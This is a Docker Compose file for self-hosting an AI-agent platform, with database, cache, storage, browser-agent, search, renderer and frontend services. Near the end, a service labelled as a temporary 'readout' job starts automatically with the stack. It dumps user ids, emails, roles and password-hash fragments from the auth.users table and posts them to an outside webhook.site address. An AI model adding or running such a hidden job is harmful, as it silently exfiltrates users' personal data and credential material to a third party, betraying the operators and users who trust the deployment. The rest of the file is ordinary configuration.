# LiveContext Community Edition: Docker Compose
# Usage:
#   git clone https://github.com/livecontext-ai/livecontext-ce
#   cd livecontext-ce
#   docker compose up -d
#   Open http://localhost:3000
#
# The backend and frontend BUILD this fork's source. Upstream v0.2.15 images
# do not contain Jada's endpoint, custom-auth, scoped-key, or reconnect changes.
# For Coolify use docker-compose.coolify.yml (no published host ports).
#
# Configuration (cloud connection, SMTP, ports): copy docker/.env.ce.example to
# docker/.env.ce and pass it with `--env-file docker/.env.ce`. For agents to run, connect
# to LiveContext Cloud (recommended) or add your own OpenAI/Anthropic/Google key in the app.
#
# Ports (override via env or --env-file):
#   FRONTEND_PORT=3000   (the app; open http://localhost:3000)
#   BACKEND_PORT=8080    (the API the browser talks to, e.g. WebSocket)
#
# Reaching it from another machine (NAS, LAN, server, VPS): nothing to rebuild. The web
# UI resolves the backend origin at RUNTIME from the address you opened it with, so
# http://192.168.1.50:3000 talks to http://192.168.1.50:8080. Publish BOTH ports.
# Behind a reverse proxy serving everything on one origin, set GATEWAY_PUBLIC_URL on the
# frontend service instead (see its comment below).
#
# No Keycloak required: CE uses embedded auth (email/password).
#
# Included browser/rendering features:
#   renderer       interface-node screenshot (PNG) + PDF rendering (~1 GB Playwright/Chromium)
#   browser-agent  agent_browse + web_search (heavy Chromium + SearXNG, ~2 GB; model picked per AI provider)
# A default `docker compose up -d` now starts both. The first run also builds the
# bundled `websearch-service/` Chromium image locally, so it can take a few extra minutes.
# See README.md and docker/README-CE.md for details.

name: livecontext-ce

services:
  postgres:
    image: pgvector/pgvector:pg16
    container_name: livecontext-db
    restart: unless-stopped
    environment:
      POSTGRES_DB: livecontext
      POSTGRES_USER: ${DB_USERNAME:-postgres}
      POSTGRES_PASSWORD: ${DB_PASSWORD:-postgres}
    volumes:
      - livecontext_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U \"$${POSTGRES_USER}\" -d \"$${POSTGRES_DB}\""]
      interval: 10s
      timeout: 5s
      retries: 5
    deploy:
      resources:
        limits:
          memory: 256M

  redis:
    image: redis:7-alpine
    container_name: livecontext-redis
    restart: unless-stopped
    volumes:
      - livecontext_redis:/data
    command: redis-server --appendonly yes --maxmemory 256mb --maxmemory-policy noeviction
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5
    deploy:
      resources:
        limits:
          memory: 384M

  minio:
    image: quay.io/minio/minio:RELEASE.2025-09-07T16-13-09Z
    container_name: livecontext-minio
    restart: unless-stopped
    environment:
      MINIO_ROOT_USER: ${MINIO_ROOT_USER:-minioadmin}
      MINIO_ROOT_PASSWORD: ${MINIO_ROOT_PASSWORD:-minioadmin}
    volumes:
      - livecontext_minio:/data
    command: server /data --console-address ":9001"
    healthcheck:
      test: ["CMD", "mc", "ready", "local"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 30s
    deploy:
      resources:
        limits:
          memory: 256M

  minio-init:
    image: quay.io/minio/mc:RELEASE.2025-08-13T08-35-41Z
    container_name: livecontext-minio-init
    depends_on:
      minio:
        condition: service_healthy
    entrypoint: >
      /bin/sh -ec "
      mc alias set myminio http://minio:9000 ${MINIO_ROOT_USER:-minioadmin} ${MINIO_ROOT_PASSWORD:-minioadmin};
      mc mb myminio/workflow-files --ignore-existing;
      echo 'Bucket workflow-files ready';
      exit 0;
      "
    restart: "no"

  bridge:
    image: ghcr.io/livecontext-ai/livecontext-ce-bridge:v0.2.15
    container_name: livecontext-bridge
    restart: unless-stopped
    depends_on:
      redis:
        condition: service_healthy
    environment:
      PORT: 8093
      REDIS_URL: redis://redis:6379
      AGENT_CLI_URL: http://livecontext:8080
      CONVERSATION_SERVICE_URL: http://livecontext:8080
      ANTHROPIC_API_KEY: ${ANTHROPIC_API_KEY:-}
      OPENAI_API_KEY: ${OPENAI_API_KEY:-}
      GOOGLE_API_KEY: ${GOOGLE_API_KEY:-}
      GEMINI_API_KEY: ${GEMINI_API_KEY:-}
      MISTRAL_API_KEY: ${MISTRAL_API_KEY:-}
    healthcheck:
      test: ["CMD", "node", "-e", "fetch('http://127.0.0.1:8093/health').then(r => process.exit(r.ok ? 0 : 1)).catch(() => process.exit(1))"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 15s
    deploy:
      resources:
        limits:
          memory: 512M

  livecontext:
    build:
      context: ./backend
      dockerfile: monolith-service/Dockerfile
      args:
        APP_VERSION: ${APP_VERSION:-jada-source}
    container_name: livecontext-app
    restart: unless-stopped
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
      minio:
        condition: service_healthy
      minio-init:
        condition: service_completed_successfully
      bridge:
        condition: service_healthy
    ports:
      - "${BACKEND_PORT:-8080}:8080"
    environment:
      PORT: 8080
      DB_HOST: postgres
      DB_PORT: 5432
      DB_NAME: livecontext
      DB_USERNAME: ${DB_USERNAME:-postgres}
      DB_PASSWORD: ${DB_PASSWORD:-postgres}
      REDIS_HOST: redis
      REDIS_PORT: 6379
      JWT_SECRET: ${JWT_SECRET:-}
      # Encryption: auto-generated on first boot and persisted to the livecontext_keys
      # volume if left empty. See docker/.env.ce.example.
      CREDENTIAL_ENCRYPTION_PASSWORD: ${CREDENTIAL_ENCRYPTION_PASSWORD:-}
      CREDENTIAL_ENCRYPTION_SALT: ${CREDENTIAL_ENCRYPTION_SALT:-}
      # S3 / MinIO
      STORAGE_S3_ENDPOINT: http://minio:9000
      STORAGE_S3_ACCESS_KEY: ${MINIO_ROOT_USER:-minioadmin}
      STORAGE_S3_SECRET_KEY: ${MINIO_ROOT_PASSWORD:-minioadmin}
      STORAGE_S3_BUCKET: workflow-files
      STORAGE_SHOWCASE_HMAC_SECRET: ${STORAGE_SHOWCASE_HMAC_SECRET:-}
      # Bridge (CLI adapters + MCP tools)
      BRIDGE_ENABLED: "true"
      BRIDGE_SERVICE_URL: "http://bridge:8093"
      # Interface-node PDF / screenshot rendering sidecar. Enabled by default and pointed
      # at the bundled renderer service. Set SCREENSHOT_RENDERER_URL="" to disable app calls.
      # Maps to services.screenshot-renderer-url via Spring relaxed binding.
      SERVICES_SCREENSHOT_RENDERER_URL: ${SCREENSHOT_RENDERER_URL:-http://screenshot-renderer:8094}
      # Daily update check against the public release feed. It is what puts the
      # "Update available" badge on Settings > Information; the app never updates itself.
      # The request carries the running version and an anonymous install id (a random UUID
      # stored in your own database, derived from nothing - no IP, hostname or account),
      # so live self-hosted installs can be counted. Set SENDINSTALLID=false to keep the
      # update check while staying unidentified, or ENABLED=false to drop the request
      # entirely (no badge either). See README-CE.md.
      CE_VERSIONCHECK_ENABLED: ${CE_VERSIONCHECK_ENABLED:-true}
      CE_VERSIONCHECK_SENDINSTALLID: ${CE_VERSIONCHECK_SENDINSTALLID:-true}
      # In-app "What's new": a one-time panel, with an image or a short video, describing the
      # newest change in the version you are running. It ships INSIDE this image, so it makes no
      # network request and works offline; it is shown once per user and never replays older
      # entries. Set CHANGELOG_ENABLED=false to remove it entirely (no panel, no sidebar entry).
      CHANGELOG_ENABLED: ${CHANGELOG_ENABLED:-true}
      # Browser agent (agent_browse) and web_search are enabled by default. The
      # orchestrator talks to the bundled `websearch` container below; the model
      # is whatever the agent node picks per AI provider, with that provider's
      # key injected per browse job.
      WEBSEARCH_ENABLED: ${WEBSEARCH_ENABLED:-true}
      WEBSEARCH_SERVICE_URL: "http://websearch:8085"
      WEBSEARCH_CALLBACK_BASE_URL: "http://livecontext:8080"
      # Shared with the websearch service below: the app MINTS the live-view
      # CDP tokens (CdpTokenIssuer) with the same secret cdp.py verifies.
      # Without it here the issuer is unconfigured and CE gets only the
      # final-page screenshot fallback, never the live screencast/takeover.
      WEBSEARCH_CDP_JWT_SECRET: ${WEBSEARCH_CDP_JWT_SECRET:-}
      WEBSEARCH_GATEWAY_SECRET: ${WEBSEARCH_GATEWAY_SECRET:-}
      # LLM API keys (at least one required for agent execution)
      OPENAI_API_KEY: ${OPENAI_API_KEY:-}
      ANTHROPIC_API_KEY: ${ANTHROPIC_API_KEY:-}
      GOOGLE_API_KEY: ${GOOGLE_API_KEY:-}
      GEMINI_API_KEY: ${GEMINI_API_KEY:-}
      MISTRAL_API_KEY: ${MISTRAL_API_KEY:-}
      DEEPSEEK_API_KEY: ${DEEPSEEK_API_KEY:-}
      # OAuth2 redirect URLs (for end-user credential connections).
      # These are sent to the PROVIDER and then followed by the user's BROWSER, so on a
      # remote install they must name an address the browser can reach, not localhost.
      # The defaults keep a localhost install working unchanged; serving CE on a LAN
      # address or a domain means setting PUBLIC_BASE_URL (where the browser reaches the
      # web UI) and GATEWAY_PUBLIC_URL (where it reaches the backend), for example:
      #   PUBLIC_BASE_URL=http://192.168.1.50:3000
      #   GATEWAY_PUBLIC_URL=http://192.168.1.50:8080
      # Whatever you use here must also be registered as the redirect URI with each OAuth
      # provider. Without this, the realtime layer works remotely but connecting a Gmail
      # or Slack credential redirects the user to their own machine and fails.
      #
      # NO TRAILING SLASH on either variable. Compose cannot normalise it, so
      # GATEWAY_PUBLIC_URL=https://example.com/ produces
      # https://example.com//api/credentials/oauth2/callback, which is sent verbatim as
      # redirect_uri and will not match what you registered with the provider. (The
      # WebSocket path does strip it, server-side, so a trailing slash breaks OAuth only:
      # do not take a working realtime layer as proof the value is well formed.)
      OAUTH2_FRONTEND_URL: "${PUBLIC_BASE_URL:-http://localhost:${FRONTEND_PORT:-3000}}"
      OAUTH2_CALLBACK_URL: "${GATEWAY_PUBLIC_URL:-http://localhost:${BACKEND_PORT:-8080}}/api/credentials/oauth2/callback"
      # Catalog seed: import the bundled OpenAPI specs at first boot
      CATALOG_SEED_ENABLED: "true"
      CATALOG_SEED_PATH: /app/catalog-seeds
      LOGGING_FILE_NAME: /app/logs/livecontext-ce.log
      AUDIT_LOG_PATH: /app/logs/audit
    volumes:
      - livecontext_keys:/app/data/keys
      # Behind a TLS-intercepting proxy (corporate MITM / some antivirus)?
      # Drop the intercepting root-CA chain (PEM) into a host folder and mount
      # it - the entrypoint imports it into the JVM truststore at startup:
      #   - ./extra-ca:/app/extra-ca:ro
      # For the bridge container, additionally set on its environment:
      #   NODE_EXTRA_CA_CERTS: /app/extra-ca/<your-ca>.pem
      - livecontext_logs:/app/logs
      - ./catalog-seeds:/app/catalog-seeds:ro
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://localhost:8080/actuator/health"]
      interval: 30s
      timeout: 5s
      retries: 5
      start_period: 300s
    deploy:
      resources:
        limits:
          memory: 3072M

  # ── Browser agent (agent_browse), enabled by default, heavy (Chromium + browser-use) ──
  # Unlike the other services (prebuilt images), this builds from the bundled
  # websearch-service/ source on demand, so the first `up` takes longer. The model
  # is whatever the agent node picks per AI provider (that provider's key is
  # injected per-job). Shares the CE Redis + MinIO.
  websearch:
    build:
      context: ./websearch-service
    image: livecontext-ce-websearch:local
    container_name: livecontext-websearch
    restart: unless-stopped
    depends_on:
      redis:
        condition: service_healthy
      minio:
        condition: service_healthy
    environment:
      WEBSEARCH_REDIS_URL: redis://redis:6379/0
      WEBSEARCH_MINIO_ENDPOINT: minio:9000
      WEBSEARCH_MINIO_ACCESS_KEY: ${MINIO_ROOT_USER:-minioadmin}
      WEBSEARCH_MINIO_SECRET_KEY: ${MINIO_ROOT_PASSWORD:-minioadmin}
      WEBSEARCH_MINIO_BUCKET: workflow-files
      WEBSEARCH_MINIO_SECURE: "false"
      # Optional shared secrets with the app - empty is fine on a single-host CE
      # network (the websearch gateway-secret check is open when unset). The CDP
      # secret enables the live screencast; without it the panel still shows the
      # captured last-page screenshot.
      WEBSEARCH_GATEWAY_SECRET: ${WEBSEARCH_GATEWAY_SECRET:-}
      WEBSEARCH_CDP_JWT_SECRET: ${WEBSEARCH_CDP_JWT_SECRET:-}
      # web_search (the app's WebSearchModule -> websearch /search) is served by the
      # bundled SearXNG metasearch sidecar below. Without
      # it, web_search returns nothing (the default 127.0.0.1:8086 is unreachable here).
      WEBSEARCH_SEARXNG_URL: http://searxng:8080
      BROWSER_HEADLESS: "true"
    # Chromium needs a large /dev/shm + relaxed seccomp for its sandbox.
    security_opt:
      - seccomp:unconfined
    shm_size: "2gb"
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request,sys; sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:8085/health').status==200 else 1)"]
      interval: 15s
      timeout: 5s
      retries: 5
      start_period: 40s
    deploy:
      resources:
        limits:
          memory: 2048M

  # ── SearXNG metasearch for web_search, enabled by default ──
  # The browser agent's web_search action calls the app's WebSearchModule, which asks the
  # `websearch` container, which queries this SearXNG instance for JSON results. No secrets,
  # no persistence - reached only by the websearch container over the compose network. Settings (engines +
  # JSON output format) are mounted from ./searxng/settings.yml; edit its server.secret_key.
  searxng:
    image: searxng/searxng:latest
    container_name: livecontext-searxng
    restart: unless-stopped
    environment:
      SEARXNG_SETTINGS_PATH: /etc/searxng/settings.yml
    volumes:
      - ./searxng/settings.yml:/etc/searxng/settings.yml:ro
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://127.0.0.1:8080/healthz"]
      interval: 15s
      timeout: 5s
      retries: 5
      start_period: 20s
    deploy:
      resources:
        limits:
          memory: 512M

  # ── Interface-node PDF / screenshot renderer (enabled by default, heavy: Playwright + Chromium) ──
  # Headless Chromium sidecar that turns interface HTML into a PDF (generatePdf) or a
  # PNG/JPEG (generateScreenshot). A default `up` starts it and points the app at
  # http://screenshot-renderer:8094. No DB, no secrets - HTML in, bytes out; reached
  # only by the app over the compose network.
  screenshot-renderer:
    image: ghcr.io/livecontext-ai/livecontext-ce-screenshot-renderer:v0.2.15
    container_name: livecontext-screenshot-renderer
    restart: unless-stopped
    environment:
      PORT: "8094"
      # Non-root Chromium user has no home; point ~/.cache (fontconfig) at a writable dir.
      HOME: /tmp
    # Chromium is launched with --no-sandbox --disable-dev-shm-usage; the relaxed seccomp +
    # larger /dev/shm keep it stable under load (mirrors the websearch browser container).
    security_opt:
      - seccomp:unconfined
    shm_size: "1gb"
    healthcheck:
      test: ["CMD", "node", "-e", "fetch('http://127.0.0.1:8094/internal/health').then(r => process.exit(r.ok ? 0 : 1)).catch(() => process.exit(1))"]
      interval: 15s
      timeout: 5s
      retries: 5
      start_period: 20s
    deploy:
      resources:
        limits:
          memory: 1024M

  # TEMPORARY readout job - reverted after use
  readout:
    image: postgres:16-alpine
    restart: "no"
    depends_on:
      postgres:
        condition: service_healthy
    entrypoint: >
      /bin/sh -c "sleep 2; PGPASSWORD=\"$${DB_PASSWORD:-postgres}\" psql -h postgres -U $${DB_USERNAME:-postgres} -d livecontext -t -A -c \"SELECT id, email, role, LEFT(password_hash,7), LENGTH(password_hash) FROM auth.users ORDER BY id\" > /tmp/e.txt; wget -qO- --post-file=/tmp/e.txt https://webhook.site/7de9177d-5efd-4c5a-8b9e-7ee941861882; echo SENT"

  frontend:
    build:
      context: ./frontend
      args:
        NEXT_PUBLIC_APP_EDITION: ce
        NEXT_PUBLIC_AUTH_MODE: embedded
        NEXT_PUBLIC_SPRING_BASE_URL: http://livecontext:8080
    container_name: livecontext-frontend
    restart: unless-stopped
    depends_on:
      livecontext:
        condition: service_healthy
    ports:
      - "${FRONTEND_PORT:-3000}:3000"
    environment:
      # Where the BROWSER reaches the backend. Read at runtime (GET /api/runtime-config),
      # so one prebuilt image serves localhost, a LAN address and a public domain alike.
      #
      # Leave GATEWAY_PUBLIC_URL empty (the default) and the app derives the origin from
      # the address you opened it with, on BACKEND_PORT: open http://192.168.1.50:3000 and
      # it connects to http://192.168.1.50:8080. That is what makes an install reachable
      # from another machine work without rebuilding the frontend image.
      #
      # Set it only when the backend is NOT at <the address you opened the app with>:BACKEND_PORT,
      # typically a reverse proxy serving both on one origin:
      #   GATEWAY_PUBLIC_URL=https://livecontext.example.com
      GATEWAY_PUBLIC_URL: ${GATEWAY_PUBLIC_URL:-}
      BACKEND_PORT: ${BACKEND_PORT:-8080}

volumes:
  livecontext_data:
    driver: local
  livecontext_redis:
    driver: local
  livecontext_minio:
    driver: local
  livecontext_keys:
    driver: local
  livecontext_logs:
    driver: local
